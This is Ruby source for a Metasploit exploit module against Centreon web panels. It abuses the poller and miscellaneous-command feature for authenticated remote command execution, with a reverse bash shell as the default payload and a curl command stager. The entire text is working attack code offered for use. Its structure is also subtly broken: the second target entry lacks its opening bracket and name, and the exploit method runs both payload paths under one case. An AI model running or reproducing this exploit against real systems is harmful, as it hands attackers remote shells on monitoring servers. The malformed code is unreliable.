# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Centreon Poller Authenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        An authenticated user with sufficient administrative rights to manage pollers can use this functionality to
        execute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules
        (to perform certain actions), by the scheduler for data processing, etc.

        This module uses this functionality to obtain a remote shell on the target.
      },
      &#039;Author&#039; => [
        &#039;Omri Baso&#039;, # discovery
        &#039;Fabien Aunay&#039;, # discovery
        &#039;mekhalleh (RAMELLA SÃ©bastien)&#039; # this module
      ],
      &#039;References&#039; => [
        [&#039;EDB&#039;, &#039;47977&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2020-01-27&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => [&#039;linux&#039;, &#039;unix&#039;],
      &#039;Arch&#039; => [ARCH_CMD, ARCH_X64],
      &#039;Privileged&#039; => true,
      &#039;Targets&#039; => [
        [&#039;Reverse shell (In-Memory)&#039;,
          &#039;Platform&#039; => &#039;unix&#039;,
          &#039;Type&#039; => :cmd_unix,
          &#039;Arch&#039; => ARCH_CMD,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039;
          }
        ],
          &#039;Platform&#039; => &#039;linux&#039;,
          &#039;Arch&#039; => ARCH_X64,
          &#039;DefaultOptions&#039; => {
            &#039;CMDSTAGER::FLAVOR&#039; => :curl
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;Notes&#039; => {
        &#039;Stability&#039; => [CRASH_SAFE],
        &#039;Reliability&#039; => [REPEATABLE_SESSION],
        &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The Centreon Web panel password to authenticate with&#039;]),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the Centreon Web panel path&#039;, &#039;/centreon&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The Centreon Web panel username to authenticate with&#039;])
    ])
  end

  def create_new_poller(poller_name, command_id)
    params = {&#039;p&#039; => &#039;60901&#039;}

    print_status("Create new poller entry on the target.")
    token = get_token(normalize_uri(target_uri.path, &#039;main.get.php&#039;), params)
    return false unless token

    response = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;main.get.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;partial&#039; => true,
      &#039;vars_get&#039; => params,
      &#039;vars_post&#039; => {
        &#039;name&#039; => poller_name,
        &#039;ns_ip_address&#039; => &#039;127.0.0.1&#039;,
        &#039;localhost[localhost]&#039; => &#039;1&#039;,
        &#039;is_default[is_default]&#039; => &#039;0&#039;,
        &#039;remote_id&#039; => &#039;&#039;,
        &#039;ssh_port&#039; => &#039;22&#039;,
        &#039;remote_server_centcore_ssh_proxy[remote_server_centcore_ssh_proxy]&#039; => &#039;1&#039;,
        &#039;engine_start_command&#039; => &#039;service centengine start&#039;,
        &#039;engine_stop_command&#039; => &#039;service centengine stop&#039;,
        &#039;engine_restart_command&#039; => &#039;service centengine restart&#039;,
        &#039;engine_reload_command&#039; => &#039;service centengine reload&#039;,
        &#039;nagios_bin&#039; => &#039;/usr/sbin/centengine&#039;,
        &#039;nagiostats_bin&#039; => &#039;/usr/sbin/centenginestats&#039;,
        &#039;nagios_perfdata&#039; => &#039;/var/log/centreon-engine/service-perfdata&#039;,
        &#039;broker_reload_command&#039; => &#039;service cbd reload&#039;,
        &#039;centreonbroker_cfg_path&#039; => &#039;/etc/centreon-broker&#039;,
        &#039;centreonbroker_module_path&#039; => &#039;/usr/share/centreon/lib/centreon-broker&#039;,
        &#039;centreonbroker_logs_path&#039; => &#039;/var/log/centreon-broker&#039;,
        &#039;centreonconnector_path&#039; => &#039;&#039;,
        &#039;init_script_centreontrapd&#039; => &#039;centreontrapd&#039;,
        &#039;snmp_trapd_path_conf&#039; => &#039;/etc/snmp/centreon_traps/&#039;,
        &#039;pollercmd[0]&#039; => command_id,
        &#039;clone_order_pollercmd_0&#039; => &#039;&#039;,
        &#039;ns_activate[ns_activate]&#039; => &#039;1&#039;,
        &#039;submitA&#039; => &#039;Save&#039;,
        &#039;id&#039; => &#039;&#039;,
        &#039;o&#039; => &#039;a&#039;,
        &#039;centreon_token&#039; => token
      }
    )
    return false unless response

    return true
  end

  def execute_command(command, opts = {})
    cmd_name = rand_text_alpha(8..42)
    params = {&#039;p&#039; => &#039;60803&#039;, &#039;type&#039; => &#039;3&#039;}
    poller_name = rand_text_alpha(8..42)

    ## Register a miscellaneous command.
    print_status("Upload command payload on the target.")

    token = get_token(normalize_uri(target_uri.path, &#039;main.get.php&#039;), params)
    unless token
      print_bad(&#039;Could not get the upload form token, potentially due to insufficient access rights.&#039;)
      return false
    end

    response = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;main.get.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;partial&#039; => true,
      &#039;vars_get&#039; => params,
      &#039;vars_post&#039; => {
        &#039;command_name&#039; => cmd_name,
        &#039;command_type[command_type]&#039; => &#039;3&#039;,
        &#039;command_line&#039; => command,
        &#039;resource&#039; => &#039;$CENTREONPLUGINS$&#039;,
        &#039;plugins&#039; => &#039;/Centreon/SNMP&#039;,
        &#039;macros&#039; => &#039;$ADMINEMAIL$&#039;,
        &#039;command_example&#039; => &#039;&#039;,
        &#039;listOfArg&#039; => &#039;&#039;,
        &#039;listOfMacros&#039; => &#039;&#039;,
        &#039;connectors&#039; => &#039;&#039;,
        &#039;graph_id&#039; => &#039;&#039;,
        &#039;command_activate[command_activate]&#039; => &#039;1&#039;,
        &#039;command_comment&#039; => &#039;&#039;,
        &#039;submitA&#039; => &#039;Save&#039;,
        &#039;command_id&#039; => &#039;&#039;,
        &#039;type&#039; => &#039;3&#039;,
        &#039;o&#039; => &#039;a&#039;,
        &#039;centreon_token&#039; => token
      }
    )
    return false unless response

    ## Create new poller to serve the payload.
    create_new_poller(poller_name, get_command_id(cmd_name))

    ## Export configuration to reload to trigger the exploit.
    poller_id = get_poller_id(poller_name)
    if poller_id.nil?
      print_bad(&#039;Could not trigger the vulnerability!&#039;)
    end
    restart_exportation(poller_id)
  end

  def get_auth
    print_status("Sending authentication request.")
    token = get_token(normalize_uri(target_uri.path, &#039;index.php&#039;))
    unless token.nil?
      response = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => @cookies,
        &#039;vars_post&#039;  => {
          &#039;useralias&#039; => datastore[&#039;USERNAME&#039;],
          &#039;password&#039; => datastore[&#039;PASSWORD&#039;],
          &#039;submitLogin&#039; => &#039;Connect&#039;,
          &#039;centreon_token&#039; => token
        }
      )
      return false unless response

      if response.redirect?
        if response.headers[&#039;location&#039;].include?(&#039;main.php&#039;)
          print_good(&#039;Successfully authenticated.&#039;)
          @cookies = response.get_cookies
          return true
        end
      end
    end

    print_bad(&#039;Your credentials are incorrect.&#039;)
    return false
  end

  def get_command_id(cmd_name)
    response = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;main.get.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;vars_get&#039; => {
          &#039;p&#039; => &#039;60803&#039;,
          &#039;type&#039; => &#039;3&#039;
      }
    )
    return nil unless response

    href = response.get_html_document.at("//a[contains(text(), \"#{cmd_name}\")]")[&#039;href&#039;]
    return nil unless href

    id = href.split(&#039;?&#039;)[1].split(&#039;&&#039;)[2].split(&#039;=&#039;)[1]
    return id unless id.empty?

    return nil
  end

  def get_poller_id(poller_name)
    response = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;main.get.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;vars_get&#039; => {&#039;p&#039; => &#039;60901&#039;}
    )
    return nil unless response

    href = response.get_html_document.at("//a[contains(text(), \"#{poller_name}\")]")[&#039;href&#039;]
    return nil unless href

    id = href.split(&#039;?&#039;)[1].split(&#039;&&#039;)[2].split(&#039;=&#039;)[1]
    return id unless id.empty?

    return nil
  end

  def get_session
    response = send_request_cgi(
      &#039;method&#039; => &#039;HEAD&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;)
    )
    cookies = response.get_cookies
    return cookies unless cookies.empty?
  end

  def get_token(uri, params = {})
    ## Get centreon_token value.
    request = {
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => uri,
      &#039;cookie&#039; => @cookies
    }
    request = request.merge({&#039;vars_get&#039; => params}) unless params.empty?
    response = send_request_cgi(request)

    return nil unless response

    begin
      token = response.get_html_document.at(&#039;input[@name="centreon_token"]&#039;)[&#039;value&#039;]
    rescue NoMethodError
      return nil
    end

    return token
  end

  def restart_exportation(poller_id)
    print_status("Reload the poller to trigger exploitation.")
    token = get_token(normalize_uri(target_uri.path, &#039;main.get.php&#039;), {&#039;p&#039; => &#039;60902&#039;, &#039;poller&#039; => poller_id})

    unless token
      print_bad(&#039;Could not get the poller form token, potentially due to insufficient access rights.&#039;)
      return false
    end

    vprint_status(&#039; -- Generating files.&#039;)
    response = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;include&#039;, &#039;configuration&#039;, &#039;configGenerate&#039;, &#039;xml&#039;, &#039;generateFiles.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;vars_post&#039; => {
        &#039;poller&#039; => poller_id,
        &#039;debug&#039; => &#039;true&#039;,
        &#039;generate&#039; => &#039;true&#039;
      }
    )
    return false unless response

    vprint_status(&#039; -- Restarting engine.&#039;)
    response = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;include&#039;, &#039;configuration&#039;, &#039;configGenerate&#039;, &#039;xml&#039;, &#039;restartPollers.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;vars_post&#039; => {
        &#039;poller&#039; => poller_id,
        &#039;mode&#039; => &#039;2&#039;
      }
    )
    return false unless response

    vprint_status(&#039; -- Executing command.&#039;)
    response = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;include&#039;, &#039;configuration&#039;, &#039;configGenerate&#039;, &#039;xml&#039;, &#039;postcommand.php&#039;),
      &#039;cookie&#039; => @cookies,
      &#039;vars_post&#039; => {&#039;poller&#039; => poller_id}
    )
    return false unless response

    return true
  end

  def exploit
    @cookies = get_session
    logged = get_auth unless @cookies.empty?
    if logged
      case target[&#039;Type&#039;]
      when :cmd_unix
        execute_command(payload.encoded)
        execute_command(generate_cmdstager.join(&#039;;&#039;))
      end
    end
  end

end

